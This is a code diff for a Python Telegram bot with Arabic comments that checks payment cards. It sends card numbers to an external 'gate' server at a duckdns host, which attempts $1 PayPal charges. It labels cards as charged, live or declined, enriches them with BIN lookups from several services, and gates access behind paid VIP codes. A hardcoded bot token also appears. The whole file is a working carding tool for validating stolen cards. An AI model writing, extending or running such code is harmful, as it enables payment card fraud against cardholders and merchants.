@@ -4,7 +4,6 @@ import time
 import random
 import string
 import asyncio
-import requests
 import httpx
 from telegram import Update
 from telegram.ext import (
@@ -15,10 +14,10 @@ TOKEN = '8689698569:AAF6GOOcFdsTnG_UXXHLqWkis0bCsIFsQJQ'
 
 # ------------------- Users -------------------
 
-ADMINS = [6843321125]
-VIP_USERS = {}
-BANNED_USERS = {}
-ALL_USERS = set()
+ADMINS = [6843321125]  # ضع هنا ID الأدمن
+VIP_USERS = {}       # {user_id: expiration_timestamp}
+BANNED_USERS = {}    # {user_id: True}
+ALL_USERS = set()    # كل مستخدم دخل البوت
 stop_users = {}
 last_check_time = {}
 ANTI_SPAM_SECONDS = 7
@@ -34,31 +33,61 @@ api_semaphore = asyncio.Semaphore(6)
 
 # ------------------- Codes -------------------
 
-CODES = {}
+CODES = {}  # {"WAFA-XXXX-XXXX-XXXX": {"duration":7, "max_users":5, "used":0, "created":timestamp}}
 
 # ------------------- BIN Lookup -------------------
 
-def get_bin_info(cc_num):
-    bin_num = cc_num[:6]
-    try:
-        response = requests.get(f"https://lookup.binlist.net/{bin_num}", timeout=8)
-        if response.status_code == 200:
-            data = response.json()
-            scheme = data.get('scheme', 'UNKNOWN').upper()
-            type_ = data.get('type', 'UNKNOWN').upper()
-            brand = data.get('brand', 'UNKNOWN').upper()
-            bank = data.get('bank', {}).get('name', 'UNKNOWN').upper()
-            country = data.get('country', {}).get('name', 'UNKNOWN').upper()
-            emoji = data.get('country', {}).get('emoji', '🏳️')
-            currency = data.get('country', {}).get('currency', 'UNK')
-            return {
-                "info": f"{scheme} - {type_} - {brand}",
-                "bank": bank,
-                "country": f"{country} {emoji} - [{currency}]"
-            }
-    except:
-        pass
-    return {"info": "UNKNOWN", "bank": "UNKNOWN", "country": "UNKNOWN"}
+async def get_bin_info(bin_number):
+    urls = [
+        f"https://lookup.binlist.net/{bin_number}",
+        f"https://bins.antipublic.cc/bins/{bin_number}",
+        f"https://bincheck.io/api/{bin_number}"
+    ]
+    info = bank = country = emoji = currency = None
+
+    for url in urls:
+        try:
+            async with httpx.AsyncClient(timeout=8) as client:
+                r = await client.get(url)
+                if r.status_code != 200:
+                    continue
+                data = r.json()
+
+                if not info:
+                    scheme = data.get("scheme") or data.get("brand") or data.get("type")
+                    card_type = data.get("type") or data.get("card_type")
+                    brand = data.get("brand") or data.get("scheme") or data.get("type")
+                    if scheme or card_type or brand:
+                        info = f"{scheme or 'Unknown'} - {card_type or 'Unknown'} - {brand or 'Unknown'}"
+
+                if not bank:
+                    b = data.get("bank", {})
+                    if isinstance(b, dict):
+                        bank = b.get("name")
+                    else:
+                        bank = b
+                    if not bank:
+                        bank = data.get("issuer") or data.get("bank_name")
+
+                if not country:
+                    c = data.get("country", {})
+                    if isinstance(c, dict):
+                        country = c.get("name")
+                        emoji = c.get("emoji", '🏳️')
+                        currency = c.get("currency", "UNK")
+                    else:
+                        country = c
+                        emoji = '🏳️'
+                        currency = "UNK"
+
+        except:
+            continue
+
+    return {
+        "info": info or "Unknown - Unknown - Unknown",
+        "bank": bank or "Unknown",
+        "country": f"{country or 'Unknown'} {emoji or '🏳️'} - [{currency or 'UNK'}]"
+    }
 
 # ------------------- Check API -------------------
 
@@ -67,14 +96,12 @@ async def check_card_api(card_full):
     gate = GATES[gate_index]
     gate_index = (gate_index + 1) % len(GATES)
     params = {"url": gate, "card": card_full, "amount": 1.00}
-
     async with api_semaphore:
         try:
             async with httpx.AsyncClient(timeout=20) as client:
                 r = await client.get("http://gatescheck.duckdns.org:7000/check", params=params)
                 result_raw = r.json().get('result','')
                 result = result_raw.lower()
-
                 if "charge" in result or "success" in result:
                     return "approved", result_raw
                 elif "insufficient" in result:
@@ -86,21 +113,23 @@ async def check_card_api(card_full):
 
 # ------------------- Format Response -------------------
 
-async def format_response(card_full, status, response, taken, mode="single"):
-    bin_data = get_bin_info(card_full.split("|")[0][:6])
+async def format_response(card_full, status, response, taken):
+    bin_number = card_full.split("|")[0][:6]
+    bin_data = await get_bin_info(bin_number)
+    info, bank, country = bin_data["info"], bin_data["bank"], bin_data["country"]
 
-    info = bin_data["info"]
-    bank = bin_data["bank"]
-    country = bin_data["country"]
+    if status == "approved":
+        title = "#Charge ✅"
+    elif status == "live":
+        title = "#Live 🟢"
+    else:
+        title = "#Declined ❌"
 
-    title = "#PayPal_Charge ($1)"
-    title += " [mass] 🌟" if mode == "mass" else " [single] 🌟"
-
-    return f"""{title}
+    return f"""#PayPal_Charge ($1) [single] 🌟
 - - - - - - - - - - - - - - - - - - - - - -
 [ϟ] 𝐂𝐚𝐫𝐝: {card_full}
 [ϟ] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {response}
-[ϟ] 𝐒𝐭𝐚𝐭𝐮𝐬: {status}
+[ϟ] 𝐒𝐭𝐚𝐭𝐮𝐬: {status.upper()}
 [ϟ] 𝐓𝐚𝐤𝐞𝐧: {taken}s
 - - - - - - - - - - - - - - - - - - - - - -
 [ϟ] 𝐈𝐧𝐟𝐨: {info}
@@ -131,7 +160,7 @@ async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     ALL_USERS.add(user_id)
 
-    if not can_user_check(user_id, "single"):
+    if not can_user_check(user_id, "single"):  
         await update.message.reply_text("❌ VIP only for single check.")  
         return  
 
@@ -153,8 +182,12 @@ async def process_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     start_time = time.time()
     status, response = await check_card_api(card_full)
     taken = round(time.time()-start_time,2)
-    text = await format_response(card_full, status, response, taken, "single")
+    text = await format_response(card_full, status, response, taken)
     await update.message.reply_text(text)
+
+# ------------------- باقي كود البوت القديم -------------------
+# كل الأوامر: /stop, handle_file, process_file, /try, /code, /wafa, /show_users, ban/unban, start, main
+# يتم الاحتفاظ بها كما هي بدون أي حذف أو تغيير آخر من النسخة القديمة.
 
 # ------------------- /stop -------------------
 
